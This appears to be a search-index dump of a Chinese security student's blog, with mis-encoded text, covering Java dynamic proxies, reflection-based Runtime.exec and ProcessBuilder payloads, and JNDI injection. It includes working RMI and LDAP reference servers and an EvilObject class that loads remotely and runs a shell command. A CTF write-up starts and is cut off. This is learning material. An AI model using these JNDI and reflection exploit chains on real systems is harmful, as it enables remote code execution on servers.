[{"categories":null,"content":"æœ‰å—å…„å¼Ÿï¼Ÿ ","date":"2025-02-22","objectID":"/about/:0:0","tags":null,"title":"å…³äº","uri":"/about/"},{"categories":["JavaSec"],"content":"åŠ¨æ€ä»£ç†\rå®šä¹‰ï¼šJVMåœ¨è¿è¡ŒæœŸåŠ¨æ€åˆ›å»ºclasså­—èŠ‚ç å¹¶åŠ è½½çš„è¿‡ç¨‹ ","date":"2025-01-29","objectID":"/cybersec/470020000/:1:0","tags":["Java","RMI"],"title":"Java RMI å­¦ä¹ ","uri":"/cybersec/470020000/"},{"categories":["JavaSec"],"content":"JDK åŠ¨æ€ä»£ç†\rjava.lang.reflect.InvocationHandler Object invoke(Object proxy, Method method, Object[] args) å®šä¹‰äº†ä»£ç†å¯¹è±¡è°ƒç”¨æ–¹æ³•æ—¶å¸Œæœ›æ‰§è¡Œçš„åŠ¨ä½œï¼Œç”¨äºé›†ä¸­å¤„ç†åœ¨åŠ¨æ€ä»£ç†ç±»å¯¹è±¡ä¸Šçš„æ–¹æ³•è°ƒç”¨ java.lang.reflect.Proxy static Object newProxyInstance(ClassLoader loader, Class[] interfaces, InvocationHandler h) åˆ›å»ºä¸€ä¸ªå®ä¾‹ï¼Œéœ€è¦ä¸‰ä¸ªå‚æ•°ï¼š æ¥å£ç±»çš„ ClassLoader æ¥å£æ•°ç»„ å¤„ç†æ¥å£æ–¹æ³•è°ƒç”¨çš„ InvocationHandler å®ä¾‹ã€‚ static InvocationHandler getInvocationHandler(Object proxy) è·å–æŒ‡å®šä»£ç†å¯¹è±¡æ‰€å…³è”çš„è°ƒç”¨å¤„ç†å™¨ static Class getProxyClass(ClassLoader loader, Class... interfaces) è·å–æŒ‡å®šæ¥å£çš„ä»£ç†ç±» static boolean isProxyClass(Class cl) åˆ¤æ–­ cl æ˜¯å¦ä¸ºä¸€ä¸ªä»£ç†ç±» è·Ÿç€å†™äº†ä¸€ä¸ªåŠ¨æ€ä»£ç†çš„ä»£ç ï¼Œæ¯”è¾ƒç®€å•çš„ä¸€å°æ®µ package com.mingzux; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.lang.reflect.Proxy; public class DynamicProxy { public static void main(String[] args) { InvocationHandler handler = new InvocationHandler() { @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.out.println(method); if (method.getName().equals(\"morning\")) { System.out.println(\"Good Morning, \" + args[0]); } return null; } }; Hello hello = (Hello) Proxy.newProxyInstance( Hello.class.getClassLoader(), new Class[] { Hello.class }, handler ); hello.morning(\"Mingzu\"); } } interface Hello { void morning(String name); } ","date":"2025-01-29","objectID":"/cybersec/470020000/:1:1","tags":["Java","RMI"],"title":"Java RMI å­¦ä¹ ","uri":"/cybersec/470020000/"},{"categories":["JavaSec"],"content":"JNDI æ³¨å…¥\rJava Naming and DirectoryInterfaceï¼ˆJavaå‘½åå’Œç›®å½•æ¥å£ï¼‰ é‡è¦ï¼šéœ€è¦çŸ¥é“ jdk ç‰ˆæœ¬å· ","date":"2025-01-29","objectID":"/cybersec/470020000/:2:0","tags":["Java","RMI"],"title":"Java RMI å­¦ä¹ ","uri":"/cybersec/470020000/"},{"categories":["JavaSec"],"content":"RMI æ”»å‡»å‘é‡\rJNDI æœ‰ä¸€ä¸ª Reference ç±»è¡¨ç¤ºå¯¹æŸä¸ªå¯¹è±¡çš„å¼•ç”¨ï¼Œè€Œå¯¹è±¡çš„ä¼ é€’æ— éå°±æ˜¯ä¸¤ç§æ–¹å¼ï¼š æŒ‰åºåˆ—åŒ–æ–¹å¼å­˜å‚¨ï¼ˆå€¼ä¼ é€’ï¼‰ æŒ‰å¼•ç”¨çš„æ–¹å¼å­˜å‚¨ï¼ˆå¼•ç”¨ä¼ é€’ï¼‰ åˆ©ç”¨æŠ€å·§ï¼š å°†æ¶æ„ Reference ç±»ç»‘å®šåœ¨ RMI æ³¨å†Œè¡¨ï¼ŒæŒ‡å‘è¿œç¨‹ class æ–‡ä»¶ å½“ JNDI å®¢æˆ·ç«¯ lookup() å‡½æ•°å¤–éƒ¨å¯æ§æˆ– Reference ç±»æ„é€ æ–¹æ³•çš„ classFactoryLocation å‚æ•°å¤–éƒ¨å¯æ§æ—¶ï¼Œå®ç°åŠ è½½è¿œç¨‹ class æ–‡ä»¶åœ¨æœ¬åœ°æ‰§è¡Œï¼Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œ RMIService.jvav package com.mingzux.JNDI; import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.Reference; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class RMIService { public static void main(String[] args) throws Exception { Registry registry = LocateRegistry.createRegistry(1099); Reference refObj = new Reference(\"EvilObject\", \"EvilObject\", \"http://127.0.0.1:8000/\"); ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj); System.out.println(\"Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/refObj'\"); registry.bind(\"refObj\", refObjWrapper); } } JNDIClient.java package com.mingzux.JNDI; import javax.naming.Context; import javax.naming.InitialContext; public class JNDIClient { public static void main(String[] args) throws Exception { // System.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\", \"true\"); String uri = \"rmi://127.0.0.1:1099/refObj\"; Context ctx = new InitialContext(); System.out.println(\"Using lookup() to fetch object with \" + uri); ctx.lookup(uri); } } EvilObject.java import java.io.BufferedReader; import java.io.InputStreamReader; public class EvilObject { public EvilObject() throws Exception { Runtime rt = Runtime.getRuntime(); String[] commands = {\"/bin/bash\", \"-c\", \"ls /\"}; Process pc = rt.exec(commands); BufferedReader result = new BufferedReader(new InputStreamReader(pc.getInputStream())); String data; while((data = result.readLine()) != null) { System.out.println(data); } pc.waitFor(); } } ","date":"2025-01-29","objectID":"/cybersec/470020000/:2:1","tags":["Java","RMI"],"title":"Java RMI å­¦ä¹ ","uri":"/cybersec/470020000/"},{"categories":["JavaSec"],"content":"LDAP æ”»å‡»å‘é‡\rç‰ˆæœ¬ï¼š8u191ã€7u201ã€6u211ä¸8u121ã€7u131ã€6u141ä¹‹é—´ åˆ©ç”¨æŠ€å·§ï¼šä¸ä¸Šé¢RMI ReferenceåŸºæœ¬ä¸€è‡´ï¼Œåªæ˜¯lookup()ä¸­çš„URLä¸ºä¸€ä¸ªLDAPåœ°å€ çœ‹äº†å¥½å‡ éï¼Œç„¶åè¾¹å†™è¾¹çœ‹è·Ÿç€æŠ„äº†ä¸€éï¼Œå¤§è‡´äº†è§£äº†ï¼Œå…ˆè¿‡ï¼ˆï¼‰ LdapServer.java package com.mingzux.Ldap; import com.unboundid.ldap.listener.InMemoryDirectoryServer; import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig; import com.unboundid.ldap.listener.InMemoryListenerConfig; import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult; import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor; import com.unboundid.ldap.sdk.Entry; import com.unboundid.ldap.sdk.LDAPException; import com.unboundid.ldap.sdk.LDAPResult; import com.unboundid.ldap.sdk.ResultCode; import javax.net.ServerSocketFactory; import javax.net.SocketFactory; import javax.net.ssl.SSLSocketFactory; import java.net.InetAddress; import java.net.MalformedURLException; import java.net.URL; public class LdapServer { private static final String LDAP_BASE = \"dc=mingzux,dc=com\"; public static void main (String[] args) { String url = \"http://127.0.0.1:8000/#EvilObject\"; int port = 1234; try { InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( \"listen\", InetAddress.getByName(\"0.0.0.0\"), port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault() )); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(\"Listening on 0.0.0.0:\" + port); ds.startListening(); } catch (Exception e) { e.printStackTrace(); } } private static class OperationInterceptor extends InMemoryOperationInterceptor { private URL codebase; public OperationInterceptor(URL cb) { this.codebase = cb; } public void processSearchResult (InMemoryInterceptedSearchResult result) { String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try { sendResult(result, base, e); } catch (Exception e1) { e1.printStackTrace(); } } protected void sendResult (InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException, MalformedURLException { URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(\".class\")); System.out.println(\"Send LDAP reference result for \" + base + \" redirecting to \" + turl); e.addAttribute(\"javaClassName\", \"Exploit\"); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf(\"#\"); if (refPos \u003e 0) { cbstring = cbstring.substring(0, refPos); } e.addAttribute(\"javaCodeBase\", cbstring); e.addAttribute(\"objectClass\", \"javaNamingReference\"); e.addAttribute(\"javaFactory\", this.codebase.getRef()); result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); } } } JNDIClient.java package com.mingzux.Ldap; import javax.naming.Context; import javax.naming.InitialContext; public class JNDIClient { public static void main(String[] args) throws Exception { String uri = \"ldap://127.0.0.1:1234/remoteObj\"; Context ctx = new InitialContext(); System.out.println(\"Using lookup() to fetch object with \" + uri); ctx.lookup(uri); } } EvilObject.java æ²¡å˜ï¼Œè·Ÿä¸Šä¸€èŠ‚ä¸€æ · ","date":"2025-01-29","objectID":"/cybersec/470020000/:2:2","tags":["Java","RMI"],"title":"Java RMI å­¦ä¹ ","uri":"/cybersec/470020000/"},{"categories":["JavaSec"],"content":"Java Reflection å­¦ä¹ \rjdk 1.8.0_72 ","date":"2025-01-29","objectID":"/cybersec/353b3b4/:1:0","tags":["Java","Reflection"],"title":"Java Reflection å­¦ä¹ ","uri":"/cybersec/353b3b4/"},{"categories":["JavaSec"],"content":"åå°„æœºåˆ¶ç®€è¿°\rjava åœ¨è¿è¡Œæ—¶ï¼š å¯¹äºä»»æ„ä¸€ä¸ªç±»ï¼Œèƒ½è·å–å®ƒçš„æ‰€æœ‰æ–¹æ³•ã€å±æ€§ã€æ„é€ å™¨ ä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œèƒ½è°ƒç”¨å®ƒçš„æ‰€æœ‰æ–¹æ³•ã€ä¿®æ”¹å®ƒçš„å±æ€§ï¼ˆåŒ…æ‹¬ç§æœ‰å±æ€§ï¼‰ è¿™ç§åŠ¨æ€è·å–ä¿¡æ¯ï¼ŒåŠ¨æ€è°ƒç”¨å¯¹è±¡æ–¹æ³•çš„åŠŸèƒ½ï¼Œå°±æ˜¯åå°„æœºåˆ¶ é€šè¿‡åå°„ï¼Œå°±å°† Java è¿™ç±»é™æ€è¯­è¨€é™„åŠ ä¸Šäº†åŠ¨æ€ç‰¹æ€§ é‚£ä¹ˆä»€ä¹ˆæ˜¯åŠ¨æ€ç‰¹æ€§ï¼Ÿ pç‰›ï¼šä¸€æ®µä»£ç ï¼Œæ”¹å˜å…¶ä¸­çš„å˜é‡ï¼Œå°†ä¼šå¯¼è‡´è¿™æ®µä»£ç äº§ç”ŸåŠŸèƒ½æ€§çš„å˜åŒ–ï¼Œæˆ‘ç§°ä¹‹ä¸ºåŠ¨æ€ç‰¹æ€§ã€‚ ä¸¾ä¾‹è¯´æ˜ public void execute(String className, String methodName) throws Exception { Class clazz = Class.forName(className); clazz.getMethod(methodName).invoke(clazz.newInstance()); } è¿™æ®µä»£ç ä¸­æ”¹å˜ä¼ å…¥å‚æ•°çš„å€¼ï¼Œå°†ä¼šè°ƒç”¨ä¸åŒç±»çš„ä¸åŒæ–¹æ³• ","date":"2025-01-29","objectID":"/cybersec/353b3b4/:2:0","tags":["Java","Reflection"],"title":"Java Reflection å­¦ä¹ ","uri":"/cybersec/353b3b4/"},{"categories":["JavaSec"],"content":"forName\rforName æœ‰ä¸¤ä¸ªå‡½æ•°é‡è½½ Class\u003c?\u003e forName(String name) Class\u003c?\u003e forName(String name, boolean initialize, ClassLoader loader) ç¬¬ä¸€ç§ç›¸å½“äºç¬¬äºŒç§çš„ä¸€ä¸ªå°è£…ï¼Œç­‰ä»·äºï¼š Calss\u003c?\u003e forName(String name, true, currentLoader) å³è‡ªåŠ¨åˆå§‹åŒ–ï¼Œå¹¶æ ¹æ®ç±»ååŠ è½½ç±» å…³äºåˆå§‹åŒ–è¿™ä¸ªæ¦‚å¿µéœ€è¦ç†è§£ä¸€ä¸‹ï¼š åœ¨ forName æ—¶ï¼Œç±»çš„æ„é€ å‡½æ•°å¹¶ä¸ä¼šæ‰§è¡Œï¼Œè¿™ä¸ªåˆå§‹åŒ–å…¶å®æ˜¯â€œç±»åˆå§‹åŒ–â€ public class Test { { System.out.println(\"Instance Initialization Block.\"); } static { System.out.println(\"Static Initialization Block.\"); } public Test() { System.out.println(\"Constructor.\"); } } ä¸‰ä¸ªå—çš„æ‰§è¡Œé¡ºåºæ˜¯ï¼š ç±»åˆå§‹åŒ–æ—¶ static {} å…ˆè¢«è°ƒç”¨ {} ä¼šåœ¨æ„é€ å‡½æ•°ä¹‹å‰æ‰§è¡Œï¼Œå› ä¸ºä»–çš„ä»£ç ä¼šæ”¾åœ¨æ„é€ å‡½æ•°çš„ super() åé¢ï¼Œæ„é€ å‡½æ•°çš„å†…å®¹å‰é¢ æ‰€ä»¥å¦‚æœæ‰§è¡Œ Test test = new Test(); ï¼Œå°†ä¼šè¾“å‡ºï¼š Static Initialization Block. Instance Initialization Block. Constructor. è€Œå¦‚æœæ‰§è¡Œ Class.forName() ï¼Œå°†ä¼šè¾“å‡º Static Initialization Block. initialize è®¾ä¸º false æ—¶ï¼Œç±»ä¸ä¼šåˆå§‹åŒ–ï¼Œæ— è¾“å‡º æ‰€ä»¥å¯¹äºä¸Šé¢çš„ execute() å‡½æ•°ï¼Œå¯ä»¥ä»…åˆ©ç”¨ç¬¬ä¸€å¥ï¼Œå°†æ¶æ„ç±»çš„æ¶æ„ä»£ç æ”¾åœ¨ static {} å†…ï¼Œä»è€Œå®ç°æ‰§è¡Œ public void execute(String className, String methodName) throws Exception { Class clazz = Class.forName(className); // clazz.getMethod(methodName).invoke(clazz.newInstance()); } ","date":"2025-01-29","objectID":"/cybersec/353b3b4/:3:0","tags":["Java","Reflection"],"title":"Java Reflection å­¦ä¹ ","uri":"/cybersec/353b3b4/"},{"categories":["JavaSec"],"content":"å†…éƒ¨ç±»å’Œå•ä¾‹\rJava çš„æ™®é€šç±» C1 ä¸­å¯ä»¥ç¼–å†™å†…éƒ¨ç±» C2 ï¼Œåœ¨ç¼–è¯‘æ—¶ç”Ÿæˆä¸¤ä¸ªæ–‡ä»¶ï¼š C1.class å’Œ C1$C2.class ï¼Œå¯é€šè¿‡ Class.forName(\"C1$C2\") åŠ è½½å†…éƒ¨ç±»ï¼Œç„¶åå¯ä»¥ä½¿ç”¨ newInstance() è°ƒç”¨ç±»çš„æ— å‚æ„é€ å‡½æ•°å®ä¾‹åŒ–è¿™ä¸ªç±» æœ‰æ—¶å€™ä¼šé‡åˆ°ä½¿ç”¨ newInstance æˆåŠŸä¸äº†ï¼ŒåŸå› å¯èƒ½æ˜¯ï¼š ä½¿ç”¨çš„ç±»æ²¡æœ‰æ— å‚æ„é€ å‡½æ•° ä½¿ç”¨çš„ç±»çš„æ„é€ å‡½æ•°æ˜¯ç§æœ‰çš„ ä¾‹å¦‚ï¼Œ java.lang.Runtime ï¼Œæ‰§è¡Œä»¥ä¸‹ä»£ç å°†ä¼šæŠ¥é”™ Class clazz = Class.forName(\"java.lang.Runtime\"); clazz.getMethod(\"exec\", String.class).invoke(clazz.newInstance(), \"id\"); å› ä¸º Runtime ç±»çš„æ— å‚æ„é€ æ–¹æ³•æ˜¯ç§æœ‰çš„ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ Runtime ç±»æ˜¯å…¸å‹çš„é¥¿æ±‰å¼å•ä¾‹ï¼š public class Runtime { private static Runtime currentRuntime = new Runtime(); public static Runtime getRuntime() { return currentRuntime; } /** Don't let anyone else instantiate this class */ private Runtime() {} æ‰€ä»¥åªèƒ½é€šè¿‡ getRuntime() è·å– Runtime å¯¹è±¡äº†ï¼Œä¿®æ”¹ payload Class clazz = Class.forName(\"java.lang.Runtime\"); clazz.getMethod(\"exec\", String.class).invoke(clazz.getMethod(\"getRuntime\").invoke(clazz), \"id\"); è®¾è®¡æ¨¡å¼ä¹‹ â€œå•ä¾‹æ¨¡å¼â€ ä¸¾ä¾‹è¯´æ˜ï¼Œå¯¹äº web åº”ç”¨ï¼Œæ•°æ®åº“è¿æ¥åªéœ€è¦å»ºç«‹ä¸€æ¬¡ï¼Œè€Œä¸éœ€è¦æ¯æ¬¡ä½¿ç”¨æ•°æ®åº“æ—¶éƒ½é‡æ–°è¿æ¥ï¼Œæ‰€ä»¥ä¸ºäº†å®ç°è¿™æ ·çš„ç›®æ ‡ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ•°æ®åº“è¿æ¥æ‰€ä½¿ç”¨çš„ç±»è®¾ç½®ä¸ºç§æœ‰ï¼Œç„¶åç¼–å†™é™æ€æ–¹æ³•æ¥è·å–ï¼Œä»è€Œå®ç°ï¼šåªæœ‰ç±»åˆå§‹åŒ–æ—¶æ‰§è¡Œä¸€æ¬¡æ„é€ å‡½æ•°ï¼Œä¹‹ååªå…è®¸é€šè¿‡ getInstance() è·å–è¯¥å¯¹è±¡ï¼Œé¿å…é‡å¤å»ºç«‹æ•°æ®åº“è¿æ¥ æ ¸å¿ƒæ€æƒ³ï¼š å”¯ä¸€æ€§ï¼šé™åˆ¶ç±»åªèƒ½è¢«å®ä¾‹åŒ–ä¸€æ¬¡ å…¨å±€è®¿é—®ï¼šæä¾›ç»Ÿä¸€çš„è®¿é—®å…¥å£ï¼Œæ–¹ä¾¿å…¶ä»–å¯¹è±¡ä½¿ç”¨è¯¥å®ä¾‹ å®ç°æ–¹å¼ï¼š é¥¿æ±‰å¼ï¼ˆEager Initializationï¼‰ é¥¿æ±‰å¼ ç±»åŠ è½½æ—¶ç«‹å³åˆ›å»ºå®ä¾‹ï¼ˆçº¿ç¨‹å®‰å…¨ï¼‰ public class Database { private static final Database INSTANCE = new Database(); private Database() {} public static Database getInstance() { return INSTANCE; } } Enum é˜²æ­¢åå°„å’Œåºåˆ—åŒ–ç ´åå•ä¾‹ï¼ˆçº¿ç¨‹å®‰å…¨ï¼‰ public class Database { enum Db { INSTANCE; private Db() {} public void connect() { // æ•°æ®åº“è¿æ¥ } } } æ‡’æ±‰å¼ï¼ˆLazy Initializationï¼‰ åŒé‡æ£€éªŒé”æ–¹å¼ï¼ˆDouble-Checked Lockingï¼‰ å»¶è¿Ÿå®ä¾‹åŒ–ï¼Œé¦–æ¬¡è°ƒç”¨æ—¶åˆ›å»ºï¼ˆéœ€è¦å¤„ç†çº¿ç¨‹å®‰å…¨ï¼‰ public class Database { private static volatile Database INSTANCE; private Database() {} public static Database getInstance() { if (INSTANCE == null) { synchronized (Database.class) { if (INSTANCE == null) { INSTANCE = new Database(); } } } return INSTANCE; } } é™æ€å†…éƒ¨ç±»æ–¹å¼ï¼ˆHolder Classï¼‰ åˆ©ç”¨ç±»åŠ è½½æœºåˆ¶ä¿è¯çº¿ç¨‹å®‰å…¨ï¼Œä¸”å»¶è¿ŸåŠ è½½ public class Database { private Database() {} private static class Holder { static final Database INSTANCE = new Database(); } public static Database getInstance() { return Holder.INSTANCE; } } å›åˆ°ä¸»çº¿ï¼Œçœ‹ä¸€ä¸‹è¿™ä¸¤ç§æƒ…å†µä¸‹æ€ä¹ˆé€šè¿‡åå°„å®ä¾‹åŒ–ç±»ï¼Ÿ ","date":"2025-01-29","objectID":"/cybersec/353b3b4/:4:0","tags":["Java","Reflection"],"title":"Java Reflection å­¦ä¹ ","uri":"/cybersec/353b3b4/"},{"categories":["JavaSec"],"content":"ä¸€ï¼šæ²¡æœ‰æ— å‚æ„é€ å‡½æ•°\rä½¿ç”¨ getConstructor æ–¹æ³•è·å–æ„é€ å‡½æ•°ï¼Œç„¶åä½¿ç”¨ newInstance å®ä¾‹åŒ– ä»¥ ProcessBuilder ä¸ºä¾‹ public final class ProcessBuilder { private List\u003cString\u003e command; private File directory; private Map\u003cString,String\u003e environment; private boolean redirectErrorStream; private Redirect[] redirects; public ProcessBuilder(List\u003cString\u003e command) { if (command == null) throw new NullPointerException(); this.command = command; } public ProcessBuilder(String... command) { this.command = new ArrayList\u003c\u003e(command.length); for (String arg : command) this.command.add(arg); } public ProcessBuilder command(List\u003cString\u003e command) { if (command == null) throw new NullPointerException(); this.command = command; return this; } public List\u003cString\u003e command() { return command; } // ç•¥ } å¯¹äºç¬¬ä¸€ä¸ªæ„é€ å‡½æ•° public ProcessBuilder(List\u003cString\u003e command) {} payload ï¼ˆå¼ºåˆ¶ç±»å‹è½¬æ¢ï¼‰ Class clazz = Class.forName(\"java.lang.ProcessBuilder\"); ((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList(\"id\"))).start(); payload ï¼ˆå®Œå…¨ä½¿ç”¨åå°„ï¼‰ Class clazz = Class.forName(\"java.lang.ProcessBuilder\"); clazz.getMethod(\"start\").invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(\"id\"))); å¯¹äºç¬¬äºŒä¸ªæ„é€ å‡½æ•° public ProcessBuilder(String... command) {} ç­‰ä»·äº public ProcessBuilder(String[] command) {} payload ï¼ˆå¼ºåˆ¶ç±»å‹è½¬æ¢ï¼‰ Class clazz = Class.forName(\"java.lang.ProcessBuilder\"); ((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(new String[][]{{\"id\"}})).start(); payload ï¼ˆå®Œå…¨ä½¿ç”¨åå°„ï¼‰ Class clazz = Class.forName(\"java.lang.ProcessBuilder\"); clazz.getMethod(\"start\").invoke(clazz.getConstructor(String[].class).newInstance(new String[][]{{\"id\"}})); ","date":"2025-01-29","objectID":"/cybersec/353b3b4/:4:1","tags":["Java","Reflection"],"title":"Java Reflection å­¦ä¹ ","uri":"/cybersec/353b3b4/"},{"categories":["JavaSec"],"content":"äºŒï¼šæ„é€ å‡½æ•°ç§æœ‰\rä½¿ç”¨ getDeclaredMethod å’Œ getDeclaredConstructor æ–¹æ³•ï¼Œæˆ–è€…å…ˆè·å–å•ä¾‹ ä»¥ Runtime ä¸ºä¾‹ payload ï¼ˆä½¿ç”¨ getDeclaredï¼‰ Class clazz = Class.forName(\"java.lang.Runtime\"); Constructor constructor = clazz.getDeclaredConstructor(); constructor.setAccessible(true); // ä¿®æ”¹ä½œç”¨åŸŸ Process process = (Process) clazz.getMethod(\"exec\", String.class).invoke(constructor.newInstance(), \"id\"); payload ï¼ˆè·å–å•ä¾‹ï¼Œè·Ÿå•ä¾‹ä»‹ç»å‰é¢æ˜¯ä¸€æ ·çš„ï¼‰ Object runtimeInstance = Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null); Class.forName(\"java.lang.Runtime\").getMethod(\"exec\", String.class).invoke(runtimeInstance, \"id\"); æ€ä¹ˆç¡®å®šå‘½ä»¤æ˜¯å¦æ‰§è¡ŒæˆåŠŸï¼Ÿï¼ˆä»¥ä¸Šé¢è¿™ä¸¤å¥ä¸ºä¾‹ï¼‰ // å¯ä»¥æ‰“å°ç»“æœï¼Œä¹Ÿå¯ä»¥è°ƒç”¨ä¸€ä¸ªå¯æ‰§è¡Œçš„ç¨‹åºï¼Œä¾‹å¦‚ calc.exe Process process = (Process) Class.forName(\"java.lang.Runtime\").getMethod(\"exec\", String.class).invoke(runtimeInstance, \"id\"); InputStream inputStream = process.getInputStream(); BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream)); String line; while ((line = reader.readLine()) != null) { System.out.println(line); } ","date":"2025-01-29","objectID":"/cybersec/353b3b4/:4:2","tags":["Java","Reflection"],"title":"Java Reflection å­¦ä¹ ","uri":"/cybersec/353b3b4/"},{"categories":["JavaSec"],"content":"è¯»å–ä¿®æ”¹å…¬æœ‰ç§æœ‰å±æ€§å’Œè¢« final æˆ– static final ä¿®é¥°çš„æˆå‘˜å˜é‡\rpackage com.mingzux; import java.lang.reflect.Field; import java.lang.reflect.Modifier; public class TestReflection { public static void main(String[] args) throws Exception { // è·å–ç±»å’Œå¯¹è±¡ Class mz = SDUer.class; SDUer mingzu = (SDUer) mz.getDeclaredConstructor().newInstance(); // è·å–ç»§æ‰¿çš„ public å­—æ®µ - name Field name = mz.getField(\"name\"); System.out.println(name); // è¯»å– name çš„å€¼, éœ€è¦è¯¥ç±»çš„å¯¹è±¡, è€Œä¸æ˜¯ç±» System.out.println(name.get(mingzu)); // ä¿®æ”¹ name çš„å€¼, éœ€è¦è¯¥ç±»çš„å¯¹è±¡, è€Œä¸æ˜¯ç±» name.set(mingzu, \"M!ng2u\"); System.out.println(name.get(mingzu)); // è·å– private å­—æ®µ - sduId Field sduId = mz.getDeclaredField(\"sduId\"); System.out.println(sduId); // è¯»å– sduId çš„å€¼ï¼ŒåŒæ ·éœ€è¦å¯¹è±¡ sduId.setAccessible(true); // private éœ€è¦ setAccessible System.out.println(sduId.get(mingzu)); // ä¿®æ”¹ sduId çš„å€¼ sduId.set(mingzu, \"2333333\"); System.out.println(sduId.get(mingzu)); // è·å–ç»§æ‰¿çš„ protected å­—æ®µ - id Field id = mz.getSuperclass().getDeclaredField(\"id\"); System.out.println(id); // è¯»å– id çš„å€¼ System.out.println(id.get(mingzu)); // ä¿®æ”¹ id çš„å€¼ id.set(mingzu, \"31415926535\"); System.out.println(id.get(mingzu)); // è·å–ç»§æ‰¿çš„è¢« final ä¿®é¥°çš„å­—æ®µ - species Field species = mz.getField(\"species\"); System.out.println(species); // è¯»å– species çš„å€¼ System.out.println(species.get(mingzu)); // ä¿®æ”¹ species çš„å€¼ // è·å– species çš„ modifiers Field speciesModifiers = species.getClass().getDeclaredField(\"modifiers\"); System.out.println(speciesModifiers); // è¯»å– modifiers çš„å€¼ speciesModifiers.setAccessible(true); System.out.println(speciesModifiers.get(species)); // å°† modifiers ä¸­çš„ final å»æ‰ speciesModifiers.setInt(species, species.getModifiers() \u0026 ~Modifier.FINAL); System.out.println(speciesModifiers.get(species)); // è¿™æ—¶å€™å°±å¯ä»¥ä¿®æ”¹ species çš„å€¼äº† species.setAccessible(true); species.set(mingzu, \"Visitor\"); System.out.println(species.get(mingzu)); // è·å–è¢« static final ä¿®é¥°çš„å­—æ®µ - university Field university = mz.getDeclaredField(\"university\"); System.out.println(university); // è¯»å– university çš„å€¼ university.setAccessible(true); System.out.println(university.get(mingzu)); university.setAccessible(false); //è¿™é‡Œä¸è®¾ false ä¼šå¯„, å¯èƒ½æ˜¯ä¸‹é¢æƒé™æ£€æŸ¥è¿‡ä¸äº† // ä¿®æ”¹ university çš„å€¼ // è·å– university çš„ modifiers Field universityModifiers = university.getClass().getDeclaredField(\"modifiers\"); System.out.println(universityModifiers); // è¯»å– modifiers çš„å€¼ universityModifiers.setAccessible(true); System.out.println(universityModifiers.get(university)); // å°† modifiers ä¸­çš„ static final å»æ‰ universityModifiers.setInt(university, university.getModifiers() \u0026 ~Modifier.FINAL); System.out.println(universityModifiers.get(university)); // ä¿®æ”¹ university çš„å€¼ university.set(mingzu, \"minihash\"); System.out.println(university.get(mingzu)); System.out.println(mingzu.university); // ç”±äº JVM å†…è”ä¼˜åŒ–, åŒ…å« final ä¿®é¥°çš„ university çš„è¿™å¥ä¼šè¢«æ”¹æˆ // System.out.println(\"SDU\"); // æ‰€ä»¥åªèƒ½ç”¨ä¸Šé¢çš„ Field.get(Object obj) æ–¹æ³•è·å– } } class SDUer extends Person { public static final String university = \"SDU\"; private String sduId = \"202322171145\"; @Override public String toString() { return \"SDUer [sduId=\" + sduId + \", name=\" + name + \", id=\" + id + \", university=\" + university + \"]\"; } } class Person { public String name = \"Mingzu\"; public String gender = \"M\"; protected String id = \"1145141919810\"; public final String species = \"Human\"; } è¾“å‡ºç»“æœä¸º ------------------------------------------------------ public java.lang.String com.mingzux.Person.name Mingzu M!ng2u ------------------------------------------------------ private java.lang.String com.mingzux.SDUer.sduId 202322171145 2333333 ------------------------------------------------------ protected java.lang.String com.mingzux.Person.id 1145141919810 31415926535 ------------------------------------------------------ public final java.lang.String com.mingzux.Person.species Human private int java.lang.reflect.Field.modifiers 17 1 Visitor ------------------------------------------------------ public static final java.lang.String com.mingzux.SDUer.university SDU private int java.lang.reflect.Field.modifiers 25 9 minihash SDU ","date":"2025-01-29","objectID":"/cybersec/353b3b4/:5:0","tags":["Java","Reflection"],"title":"Java Reflection å­¦ä¹ ","uri":"/cybersec/353b3b4/"},{"categories":["CTF"],"content":"SUCTF 2025 ï¼ˆå¤ç°ï¼‰\r","date":"2025-01-24","objectID":"/cybersec/cc76721/:1:0","tags":["CTF"],"title":"SUCTF 2025","uri":"/cybersec/cc76721/"},{"categories":["CTF"],"content":"web\r","date":"2025-01-24","objectID":"/cybersec/cc76721/:2:0","tags":["CTF"],"title":"SUCTF 2025","uri":"/cybersec/cc76721/"},{"categories":["CTF"],"content":"SU_photogallery\r0x00 ä¿¡æ¯æ”¶é›†\rè®¿é—® /robots.txt ï¼Œæç¤º see see node.md è®¿é—®ä¸å­˜åœ¨çš„æ–‡ä»¶ï¼Œå‡ºç°ä¸‹é¢è¿™ä¸ªç•Œé¢ çœ‹è¿‡ wp ä¹‹åï¼Œäº†è§£åˆ°è¿™æ˜¯åœ¨æç¤º php -S å¯åŠ¨çš„æœåŠ¡ 0x01 è·å–æºç \rå‚è€ƒï¼šhttps://projectdiscovery.io/blog/php-http-server-source-disclosure \u003c?php /* * @Author: Nbc * @Date: 2025-01-13 16:13:46 * @LastEditors: Nbc * @LastEditTime: 2025-01-13 16:31:53 * @FilePath: \\src\\unzip.php 